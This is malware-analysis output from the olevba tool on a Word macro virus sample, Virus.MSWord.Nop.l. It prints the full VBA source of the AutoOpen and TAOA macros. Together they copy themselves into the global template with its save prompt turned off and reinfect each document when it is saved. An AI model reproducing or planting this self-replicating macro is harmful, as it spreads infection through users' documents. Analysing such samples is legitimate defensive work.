olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nop.l - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim m$
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
m$ = WordBasic.[FileName$]() + ":TAOA"
WordBasic.MacroCopy m$, "Global:DateiSpeichern"
m$ = WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy m$, "Global:TAOA"
End Sub
-------------------------------------------------------------------------------
VBA MACRO TAOA.bas 
in file: Virus.MSWord.Nop.l - OLE stream: 'Macros/VBA/TAOA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TAOA.MAIN"
Dim m$
m$ = WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:TAOA", m$
m$ = WordBasic.[FileName$]() + ":TAOA"
WordBasic.MacroCopy "Global:DateiSpeichern", m$
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

